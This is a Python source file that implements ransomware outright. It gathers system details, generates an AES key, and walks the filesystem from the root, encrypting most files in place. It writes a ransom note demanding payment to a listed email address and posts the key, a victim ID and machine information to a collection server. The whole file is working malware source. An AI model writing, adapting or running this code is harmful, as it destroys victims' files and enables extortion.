from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from datetime import datetime
from decrypter import Decrypter
import os, platform,requests,random,hashlib,string

my_system = platform.uname()
System = my_system.system
Name = my_system.node
Release = my_system.release
Version = my_system.version
Machine = my_system.machine
Processor = my_system.processor

def gen_string(size=64, chars=string.ascii_uppercase + string.digits):
      return ''.join(random.choice(chars) for _ in range(size))

key = hashlib.md5(gen_string().encode('utf-8')).hexdigest()

iv = 'This is an IV456'
digits = random.randint(1111,9999)
url = "http://127.0.0.1:8000"


def SendData(decrypted): 
    try:
        now = datetime.now()
        date = now.strftime("%d/%m/%Y %H:%M:%S")

        data = f'["{digits}", "{key}", "{date}", "{decrypted}", "{System}","{Name}","{Release}" ,"{Version}","{Machine}","{Processor}"]'

        requests.post(url, data)
    except:
        SendData(decrypted)

class ransomware:
    EXCLUDE_DIRECTORY = ['Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData'
                        'Program Files']

    EXCLUDE_EXTENSION = ('.dll',
                        '.img',
                        '.exe')
    def __init__(self,key,iv,folder):
        self.key = key
        self.iv = iv
        self.folder = folder
        
    def encrypt(self,plaintext):
        cipher1 = AES.new(self.key.encode(),AES.MODE_CBC,self.iv.encode())
        ciphertext = cipher1.encrypt(pad(plaintext,16))
        return(ciphertext)

    def encrypter(self,file):
        f = open(file,'rb')
        plaintext = f.read()
        f.close()

        f = open(file,'wb')
        encrypted = self.encrypt(plaintext)
        f.write(encrypted)
        f.close()
    def mainencoder(self):
        info = '''
ATTENTION!

Don't worry, you can return all your files!
All your files like pictures, databases, documents and other important are encrypted with strongest encryption and unique key.
The only method of recovering files is to purchase decrypt tool and unique key for you.
This software will decrypt all your encrypted files.
What guarantees you have?
    You can send one of your encrypted file from your PC and we decrypt it for free.
    But we can decrypt only 1 file for free. File must not contain valuable information.
    You can get and look video overview decrypt tool:

Price of private key and decrypt software is $5.
Discount 50% available if you contact us first 72 hours, that's price for you is $2.
Please note that you'll never restore your data without payment.
Check your e-mail "Spam" or "Junk" folder if you don't get answer more than 6 hours.


To get this software you need write on our e-mail:
kalilinux404@gmail.com

Reserve e-mail address to contact us:

Your personal ID:   '''
        for (roots,dirs,files) in os.walk(self.folder):
            if any(s in roots for s in self.EXCLUDE_DIRECTORY):
                pass
            else:
                f = open(roots+'\\readme.txt','w')
                f.write(info+str(digits))
                f.close()
                for i in files:
                    filename = roots+"\\"+i
                    if filename.endswith(self.EXCLUDE_EXTENSION):
                        pass
                    else:
                        print('files encrypted: ',filename)
                        self.encrypter(filename)

def Decryption():
    nkey = input("Enter the key: ") 
    if nkey == key:
        d = Decrypter(nkey,"/")
        d.mainencoder()
        SendData('true')
    else:
        Decryption()


r = ransomware(key,iv,'/')
r.mainencoder()
SendData('false')
print("Data sent")
Decryption()